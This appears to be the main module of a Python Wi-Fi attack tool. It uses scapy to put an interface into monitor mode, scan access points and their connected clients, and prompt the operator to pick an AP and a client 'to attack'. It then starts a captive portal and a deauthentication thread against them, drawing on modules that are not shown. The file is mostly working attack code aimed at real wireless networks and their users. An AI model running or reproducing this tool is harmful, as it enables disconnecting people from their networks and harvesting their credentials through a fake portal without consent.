import Deauthentication as deauth
from CaptivePortal import CaptivePortal as CP
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt

APs_list = []  # [essid, bssid, channel]
users_list = []
essids_set = set()
ESSID = 0  # Ap's name
BSSID = 1  # Ap's mac address
CHANNEL = 2  # Ap's channel
search_time = 30

def change_channel(interface):
    channel_switch = 1
    while True:
        try:
            if os.system('iwconfig %s channel %d' % (interface, channel_switch)) != 0:
                raise Exception()
            # switch channel in range [1,14] each 0.5 seconds
            channel_switch = channel_switch % 14 + 1
            time.sleep(0.5)
        except:
            sys.exit("can't switch channels at " + interface)


def packet_handler(packet):
    # We are interested only in Beacon frame
    # Beacon frames are transmitted periodically, they serve to announce the presence of a wireless LAN
    if packet.haslayer(Dot11Beacon):
        # Get the source MAC address - BSSID of the AP
        bssid = packet[Dot11].addr2
        # Get the ESSID (name) of the AP
        essid = packet[Dot11Elt].info.decode()
        # Check if the new found AP is already in the AP set
        if essid not in essids_set:
            essids_set.add(essid)
            # network_stats() function extracts some useful information from the network - such as the channel
            stats = packet[Dot11Beacon].network_stats()
            # Get the channel of the AP
            channel = stats.get("channel")
            # Add the new found AP to the AP list
            APs_list.append([essid, bssid, channel])
            # print("AP name: %s,\t BSSID: %s,\t Channel: %d." % (essid, bssid, channel))


# ## After the user choose the AP he want to attack, we want to set the interface's channel to the same channel as
# the choosen AP.
def set_channel(channel, interface):
    os.system('iwconfig %s channel %d' % (interface, channel))


def APs_scan(interface):
    print("*** Step 2:  Choosing an network to attack. *** \n")
    input("Press Enter to continue.........")
    channel_changer = threading.Thread(target=change_channel, args=(interface,))
    # A daemon thread runs without blocking the main program from exiting
    channel_changer.daemon = True
    channel_changer.start()
    print("\n Scanning for networks...\n")
    # Sniffing packets - scanning the network for AP in the area
    # iface – the interface that is in monitor mode
    # prn – function to apply to each packet
    # timeout – stop sniffing after a given time
    sniff(iface=interface, prn=packet_handler, timeout=search_time)
    num_of_APs = len(APs_list)
    # If at least one AP was found, print all the found APs
    if num_of_APs > 0:
        # If at least 1 AP was found.
        print("\n*************** APs Table ***************\n")
        for x in range(num_of_APs):
            print("[" + str(x) + "] - BSSID: " + APs_list[x][BSSID] + " \t Channel:" + str(
                APs_list[x][CHANNEL]) + " \t AP name: " + APs_list[x][ESSID])
        print("\n************* FINISH SCANNING *************\n")
        # Choosing the AP to attack
        ap_index = int(input("Please enter the number of the AP you want to attack: "))
        # Print the choosen AP
        print("You choose the AP: [" + str(ap_index) + "] - BSSID: " + APs_list[ap_index][
            BSSID] + " Channel:" + str(
            APs_list[ap_index][CHANNEL]) + " AP name: " + APs_list[ap_index][ESSID])
        # Set the channel as the choosen AP channel in order to send packets to connected clients later
        set_channel(int(APs_list[ap_index][CHANNEL]), interface)
        return APs_list[ap_index]
    else:
        # If no AP was found.
        rescan = input("No networks were found. Do you want to rescan? [Y/n] ")
        if rescan == "n":
            print("  Sorry :(  ")
            deactivate_monitor(interface)
            sys.exit(0)
        else:
            APs_scan(interface)


### In this fucntion we scan the network for clients who are connected to the choosen AP.
### We present to the user all the clients that were found, and he choose which client he want to attack.
def users_scan(interface, ap):
    # We need the client to send packet to the AP and it may take time, so we double the scan time
    print("\nScanning for clients that connected to: " + ap[ESSID] + " ...")
    '''
    channel_changer = Thread(target=change_channel)
    # A daemon thread runs without blocking the main program from exiting
    channel_changer.daemon = True
    channel_changer.start()
    '''
    # Sniffing packets - scanning the network for clients which are connected to the choosen AP
    global network
    network = ap
    sniff(iface=interface, prn=client_scan_pkt, timeout=search_time)
    num_of_client = len(users_list)
    # If at least one client was found, print all the found clients
    if num_of_client > 0:
        # If at least 1 client was found.
        print("\n*************** Clients Table ***************\n")
        for x in range(num_of_client):
            print("[" + str(x) + "] - " + users_list[x])
        print("\n************** FINISH SCANNING **************\n")
        # Choosing the AP to attack
        client_index = input(
            "Please enter the number of the client you want to attack or enter 'R' if you want to rescan: ")
        if client_index == 'R':
            # Rescan
            users_scan(interface, ap)
        elif client_index.isnumeric():
            # Client was choosen
            # Print the choosen AP
            print("You choose the client: [" + client_index + "] - " + users_list[int(client_index)])
            return users_list[int(client_index)]
            # deauth_attack()
    else:
        # If no client was found.
        rescan = input("No clients were found. Do you want to rescan? [Y/n] ")
        if rescan == "n":
            print("  Sorry :(  ")
            deactivate_monitor(interface)
            sys.exit(0)
        else:
            users_scan(interface, ap)


### sniff(..., prn = client_scan_pkt, ...)
### The argument 'prn' allows us to pass a function that executes with each packet sniffed
def client_scan_pkt(pkt):
    # We are interested in packets that send from the choosen AP to a client (not broadcast)
    # ff:ff:ff:ff:ff:ff - broadcast address
    if (pkt.addr2 == network[BSSID] or pkt.addr3 == network[BSSID]) and pkt.addr1 != "ff:ff:ff:ff:ff:ff":
        if pkt.addr1 not in users_list:
            if pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3:
                # Add the new found client to the client list
                users_list.append(pkt.addr1)
                print("Client with MAC address: " + pkt.addr1 + " was found.")


def activate_monitor():
    print("*** Step 1:  Choosing an interface to put in 'monitor mode'. *** \n")
    input("Press Enter to continue.........")
    os.system('ifconfig')
    interface = input("Please enter the interface name you want to put in 'monitor mode': ")
    # Put the choosen interface in 'monitor mode'
    try:
        if os.system('ifconfig ' + interface + ' down') != 0:
            raise Exception()
        if os.system('iwconfig ' + interface + ' mode monitor') != 0:
            raise Exception()
        if os.system('ifconfig ' + interface + ' up') != 0:
            raise Exception()
    except:
        sys.exit("can't activate monitor mode on " + interface)
    return interface
    # os.system('iwconfig') # Check


def deactivate_monitor(interface):
    print("\n*** Step 5: Put the interface back in 'managed mode'. *** \n")
    input("Press Enter in order to put " + interface + " in 'managed mode' .........")
    # Put the choosen interface back in 'managed mode'
    os.system('ifconfig ' + interface + ' down')
    os.system('iwconfig ' + interface + ' mode managed')
    os.system('ifconfig ' + interface + ' up')
    print("[**] - The interface: " + interface + ", is now in Managed Mode. \nYou can check it here : \n")
    # os.system('iwconfig')


def start(self, user, network):
    CP.start()
    deauthAttack = threading.Thread(target=deauth.start, args=(user, network))
    deauthAttack.start()
    deauthAttack.join()
    self.deactivate_monitor()
